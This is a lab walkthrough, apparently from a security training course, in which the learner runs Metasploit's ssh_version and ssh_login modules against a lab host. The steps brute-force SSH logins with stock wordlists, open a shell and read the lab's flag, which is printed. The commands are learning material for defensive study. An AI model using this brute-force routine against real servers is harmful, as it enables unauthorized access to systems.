SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet. 
+ It is typically used for remote access to servers and systems. + SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port. 
+ We can utilize auxiliary modules to enumerate the version of SSH running on the target as well as perform brute-force attacks to identify passwords that can consequently provide us remote access to a target

SSH (Secure Shell) is a network protocol that allows secure access to remote systems over an unsecured network. It provides encrypted communication between a client and a server, typically used for remote administration, file transfers, and tunneling.

In this lab, we will look at a couple of SSH related metasploit modules and run them against the target.

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running an SSH service will be accessible at **demo.ine.local**.

**Objective:** Your task is to run the following auxiliary modules against the target:

- auxiliary/scanner/ssh/ssh_version
- auxiliary/scanner/ssh/ssh_login

The following username and password dictionary will be useful: - /usr/share/metasploit-framework/data/wordlists/common_users.txt - /usr/share/metasploit-framework/data/wordlists/common_passwords.txt

# Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework

___________

**Step 1:** Open the lab link to access the Kali machine.

![Content Image](https://assets.ine.com/lab/learningpath/318e9e8673dd0612d6ef35ea09fa4ac1255719a0e69edbf9a48ab199b03c28b4.jpg)

**Step 2:** Check if the target machine is reachable:

**Command:**

```
ping -c 4 demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/253047edbf7298338255fed91ded96bf4de5665547d09d619c002897138e8b95.jpg)

The target is reachable.

**Step 3:** Run an Nmap scan against the target:

**Command:**

```
nmap -sS -sV demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/07c8b3d8d7e2164939b05eda7bf1b8f81152fc92ad0f825dd2881bc36875ff6b.jpg)

**Step 4:** We have discovered ssh service is running on the target machine. We will use the provided auxiliary modules against target.

**Commands:**

```
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
exploit
```

![Content Image](https://assets.ine.com/lab/learningpath/b32b8ef443ba41bc80d037dfd9db14bd9eaa3c23ef3c8c5ca01e2dabe65b8027.jpg)

![Content Image](https://assets.ine.com/lab/learningpath/571a12e979bf478964d3d0d0e1aa3a02d1e75da0d53fb3a7971c976002024afa.jpg)

We will now use ssh_login module to find the valid credentials to access the ssh server.

**Commands:**

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```

![Content Image](https://assets.ine.com/lab/learningpath/84a09d0d24320b32d7a4dec70b15f86afa72cf8df26dbfd3ec23a1a73a9af794.jpg)

**Step 5:** Find the flag.

**Commands:**

```
sessions
sessions -i 1
find / -name "flag"
cat /flag
```

![Content Image](https://assets.ine.com/lab/learningpath/df4952896cb8f8f24959a6c39e280882318a7e8020c28103f6474cd2721e6063.jpg)

![Content Image](https://assets.ine.com/lab/learningpath/046289af9a593fd35ad5dbf71e5b421c4b68dde6ca74bb529812734f51e14826.jpg)

This reveals the flag to us.

**Flag:** eb09cc6f1cd72756da145892892fbf5a

# Conclusion

In this lab, we explored a couple of metasploit modules related to SSH and ran them against the target.

# References

- [SSH](https://en.wikipedia.org/wiki/Secure_Shell)
- [Telnet Login Auxiliary Module](https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_login)
- [Telnet Version Detection Auxiliary Module](https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_version)